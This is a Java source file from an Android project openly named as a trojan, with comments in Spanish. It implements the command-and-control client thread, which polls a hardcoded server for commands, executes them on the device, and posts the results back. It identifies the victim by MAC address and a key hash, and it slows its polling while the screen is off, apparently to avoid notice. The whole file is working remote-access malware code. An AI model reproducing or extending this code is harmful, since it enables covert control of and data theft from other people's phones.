package trojan.android.android_trojan.action;

import android.content.Context;
import android.os.Looper;


import java.net.MalformedURLException;
import java.net.URL;


public class ConnectionServerThread implements Runnable
{
    /* Tag del servicio que esta corriendo para el log */
    private static final String TAG = "ConnectionServerTask";
    /* Objeto que maneja la funcionalidad del cliente */
    private ActionService actionService;
    /* host al que se comunicara */
    private String host;
    /* Puerto que ocupara */
    private String port;
    /* URL que contendra la accion */
    private URL urlaction;
    /* URL que contendra el resultado */
    private URL urlresult;
    /* Contextode la actividad */
    private Context context;
    /* Tiempo que estara on */
    private long timeon;
    /* Tiempopara que s eponga off */
    private long timeoff;
    private long time;
    private long detla;
    /* Variables para la conexion segura */
    private String SALT = "LOL";
    private String KEY = null;
    private String HASH = null;
    private String MAC = null;
    private boolean cancel = false;
    private IHttpURLConnection httpURLConnection;


    public ConnectionServerThread(Context context)
    {
        this.context = context;
        this.httpURLConnection = new HttpsURLConnectionHelper();
        /* Aqui se modifica si se quiere otra contraseña, host, puerto, tiempos de servicio*/
        this.KEY = SALT + "8df639b301a1e10c36cc2f03bbdf8863";
        this.host = "192.168.100.16";
        this.port = "443";
        this.timeon = 4000;
        this.timeoff = 54000;
        this.time = timeon;
        actionService = new ActionService(context);
        this.HASH = Tools.SHA1(this.KEY);
        this.MAC = Tools.getMacAddress(this.context);

        /* Intenta obtener los dos recursos para cuando corra el hilo*/
        /* Cuando corra el hilo, se ejecutara el metodo run, debajod e este*/
        try {
            this.urlaction = new URL("https://"+ host +":"+port+"/action");
            this.urlresult = new URL("https://"+ host +":"+port+"/result");
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void run() {
        Looper.prepare();
        String result;
        long now;
        /* Mientras no reciba comandode parar, se repetira este loop*/
        while (!isCancel())
        {
            now = System.currentTimeMillis();
            if (time != timeoff && !Tools.isScreenOn(context)) {
                time = timeoff;
            }else if (time != timeon && Tools.isScreenOn(context)) {
                time = timeon;
            }

            if (detla > time)
            {
                /* Obtiene el comando */
                result = this.httpURLConnection.getHttp(urlaction, this.MAC + "::::" +this.HASH);
                if (result != null && !result.equals("null"))
                {
                    /* Ejecuta el comando */
                    this.httpURLConnection.postHttp(urlresult, actionService.action(result), this.MAC + "::::" +this.HASH);
                    detla = 0;
                }
            }
            detla += now;
            Tools.sleep(timeon/2);
        }

    }

    public boolean isCancel(){
        return this.cancel;
    }

    public void cancel(){
        this.cancel = true;
    }
}
